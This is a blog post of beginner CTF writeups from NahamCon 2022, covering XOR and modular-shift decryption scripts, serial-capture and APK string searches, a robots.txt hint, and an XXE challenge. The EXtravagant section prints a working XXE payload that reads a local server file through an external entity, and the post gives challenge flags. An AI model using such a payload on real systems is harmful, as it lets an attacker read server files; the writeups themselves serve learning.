---
draft: false

title: 'Assorted Writeups From NahamCon CTF 2022'
date: 2022-05-01

description: 'Dweeno, Unimod, Cereal, Mobilize, Jurrasic Park, EXtravagant'
tags: ['ctf']
---

Last week, I had the pleasure of participating in the 2022 NahamCon CTF, created and supported by the hard work of [@NahamSec](https://twitter.com/NahamSec), [@/_JohnHammond](https://twitter.com/_JohnHammond), and so many others — it was a blast. I competed on behalf of Western Washington University, and I am especially pleased with our performance; as shown in the cover photo, we scored in the top one percent of all teams.

Overall, the event was a profound learning experience, so why not pay that forward? This post contains writeups of the some of the simple challenges personally completed during NahamCon CTF 2022, including *Dweeno*, *Unimod*, *Cereal*, *Mobilize*, *Jurrasic Park*, and *EXtravagant*.

Looking for writeups of other NahamCon CTF 2022 challenges? See [my teammate's blog page](https://nburns.tech/docs/CTFs/NahamCon_2022/Intro)!

## Dweeno (Hardware)

![Screenshot of Dweeno](/img/nahamcon-ctf-2022-dweeno-1.webp)

*Dweeno*, under the hardware category, dealt with reversing encryption on the challenge flag created by an Arduino Mega. I have never used an Ardunio before — further, the diagram mistakenly listed the wrong microcontroller — so this challenge initially appeared hard to approach.

### Provided Files

#### sketch.pdf

![Screenshot of Dweeno sketch.pdf](/img/nahamcon-ctf-2022-dweeno-2.webp)

#### setup.webp

![Screenshot of Dweeno setup.webp](/img/nahamcon-ctf-2022-dweeno-3.webp)

#### source.ino
```c
char * flag = "REDACTED";
String curr, first, second;
int in1=29, in2=27, in3=25, in4=23;
int out1=53, out2=51, out3=49, out4=47;
int i;

String get_output(String bits) {
    String output;
    digitalWrite(out1, ((bits[0] == '1')? HIGH : LOW));
    digitalWrite(out2, ((bits[1] == '1')? HIGH : LOW));
    digitalWrite(out3, ((bits[2] == '1')? HIGH : LOW));
    digitalWrite(out4, ((bits[3] == '1')? HIGH : LOW));
    delay(1000);
    output += String(digitalRead(in1));
    output += String(digitalRead(in2));
    output += String(digitalRead(in3));
    output += String(digitalRead(in4));
    return output;
}

//converts a given number into binary
String binary(int number) {
  String r;
  while(number!=0) {
    r = (number % 2 == 0 ? "0" : "1")+r; 
    number /= 2;
  }
  while ((int) r.length() < 8) {
    r = "0"+r;
  }
  return r;
}

void setup() {
  i = 0;
  pinMode(out1, OUTPUT);
  pinMode(out2, OUTPUT);
  pinMode(out3, OUTPUT);
  pinMode(out4, OUTPUT);
  pinMode(in1, INPUT);
  pinMode(in2, INPUT);
  pinMode(in3, INPUT);
  pinMode(in4, INPUT);
  Serial.begin(9600);
}

void loop() {
  if (i < strlen(flag)) {
    curr = binary(flag[i]);
    first = curr.substring(0,4);
    second = curr.substring(4,8);
    Serial.print(get_output(first));
    Serial.println(get_output(second));
    delay(1000);
    i++;
  }
}
```

#### output.txt

```
00110011
00111001
00110100
00110010
00101110
00110100
01100100
01100011
00110111
01101101
01100101
01100111
01100010
00110110
00110011
01100110
01100010
01100001
00110111
01100100
01100100
01100000
00110011
01100010
00110110
01100110
00110000
01100111
00110011
01100011
01100111
01100111
00110001
01101101
01100001
00110111
00110110
00101000
```

### Understanding the Environment

Putting `output.txt` through a [binary to ASCII converter](https://www.rapidtables.com/convert/number/binary-to-ascii.html) yielded the following, which looked like a shifted version of the original flag (`flag{...}`).

![Screenshot of Dweeno output converted to ASCII chars](/img/nahamcon-ctf-2022-dweeno-4.webp)

To better understand what the Ardunio did, I found [the documentation for the IC on the breadboard](https://pdf1.alldatasheet.com/datasheet-pdf/view/53786/FAIRCHILD/MM74HC86N.html). Clearly, the bits of the characters of the flag were simply `xor`ed depending on their position. Thus, I annotated the `sketch.pdf` like so:

![Screenshot of Dweeno annotated diagram](/img/nahamcon-ctf-2022-dweeno-5.webp)

### Developing a Decryptor

I wrote a Python script to decrypt the flag, which simply reversed the operation performed by the Arduino.

```python
#!/usr/bin/env python3

import binascii

xorPat = int("01010101", 2)

with open('output.txt', 'r') as file:
    output = file.read().replace('\n', '')

for bit in range(0, len(output), 8):
    byte = int(output[bit:bit + 8], 2)
    flag = byte ^ xorPat

    print(flag.to_bytes((flag.bit_length() + 7) // 8, 'big').decode(), end = '')

print()
```

### Flag

Executing the script I wrote above:

```
dev ~/projects/ctf/dweeno $ ls
dweeno.py  output.txt
dev ~/projects/ctf/dweeno $ ./dweeno.py 
flag{a16b8027cf374b115f7c3e2f622d84bc}
dev ~/projects/ctf/dweeno $ 
```

---

## Unimod (Cryptography)

![Screenshot of Unimod](/img/nahamcon-ctf-2022-unimod-1.webp)

*Unimod* (cryptography) was quite simple; all it involved was brute-forcing the reverse of the included cryptographic script.

### Provided Files

#### unimod.py

```python
import random

flag = open('flag.txt', 'r').read()
ct = ''
k = random.randrange(0,0xFFFD)
for c in flag:
    ct += chr((ord(c) + k) % 0xFFFD)

open('out', 'w').write(ct)

```

#### out

```
饇饍饂饈饜餕饆餗餙饅餒餗饂餗餒饃饄餓饆饂餘餓饅餖饇餚餘餒餔餕餕饆餙餕饇餒餒饞飫
```

### Developing a Decryptor

I wrote a script to brute force a reverse operation on every key value (`k`) in the specified range (`random.randrange(0,0xFFFD)`, or 0 to 65533).

```python
#!/usr/bin/env python3

enc = "饇饍饂饈饜餕饆餗餙饅餒餗饂餗餒饃饄餓饆饂餘餓饅餖饇餚餘餒餔餕餕饆餙餕饇餒餒饞飫"

for k in range(0,0xFFFD):
    dec = ""
    for chars in enc:
        dec += (chr((ord(chars) + k) % 0xFFFD))
    try:
        print(dec)
    except:
        continue
```

### Flag

Executing the script I wrote above:

```
dev ~/projects/ctf/unimod $ ./unimod.py | grep -a flag
flag{4e68d16a61bc2ea72d5f971344e84f11}
dev ~/projects/ctf/unimod $ 
```

---

## Cereal (Hardware)

![Screenshot of Cereal](/img/nahamcon-ctf-2022-cereal-1.webp)

Also part of the hardware category, *Cereal* was another simple challenge. This one involved analyzing serial data transmission (hence the pun) for the flag.

### Provided Files

#### mystery.sal

Analog data; no preview shown.

### Flag

I have already performed a similar task on HackTheBox, so I already knew what to do here. Simply opening `mystery.sal` in Logic 2's *Console View* displayed the flag.

![Screenshot of Cereal](/img/nahamcon-ctf-2022-cereal-2.webp)

---

## Mobilize (Mobile)

![Screenshot of Mobilize](/img/nahamcon-ctf-2022-mobilize-1.webp)

One of the easiest challenges of the competition in my opinion, *Mobilize* (mobile) had the plaintext string within its APK package.

### Provided Files

#### mobilize.apk

Android application package; no preview provided.

### Flag

`strings` revealed the flag — always check the simple solutions!

```
slak@parrot:~/ctf/mobilize $ strings mobilize.apk | grep -oP "flag{.*}"
flag{e2e7fd4a43e93ea679d38561fa982682}
slak@parrot:~/ctf/mobilize $ 
```

---

## Jurrasic Park (Web)

![Screenshot of Jurrasic Park](/img/nahamcon-ctf-2022-park-1.webp)

The easiest web challenge, *Jurrasic Park* had a pointer to the flag on the `robots.txt` page.

### Navigation

#### robots.txt

![Screenshot of Jurrasic Park](/img/nahamcon-ctf-2022-park-2.webp)

#### /ingen

![Screenshot of Jurrasic Park](/img/nahamcon-ctf-2022-park-3.webp)

### Flag


![Screenshot of Jurrasic Park flag](/img/nahamcon-ctf-2022-park-4.webp)

---

## EXtravagant (Web)

![Screenshot of EXtravagant](/img/nahamcon-ctf-2022-extravagant-1.webp)

*EXtravagant* (web) was vulnerable to [XXE](https://portswigger.net/web-security/xxe)

### Crafting an Exploit

[PortSwigger's XXE page](https://portswigger.net/web-security/xxe) helped me create the following exploit to reveal the flag:

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///var/www/flag.txt'>]><root>&test;</root>
```

### Using the Exploit

#### Uploading

![Screenshot of uploading EXtravagant exploit XML](/img/nahamcon-ctf-2022-extravagant-2.webp)

#### Viewing

![Screenshot of viewing EXtravagant exploit XML](/img/nahamcon-ctf-2022-extravagant-3.webp)

### Flag

Clicking `Submit` revealed the flag on the webpage.

![Screenshot of EXtravagant flag](/img/nahamcon-ctf-2022-extravagant-4.webp)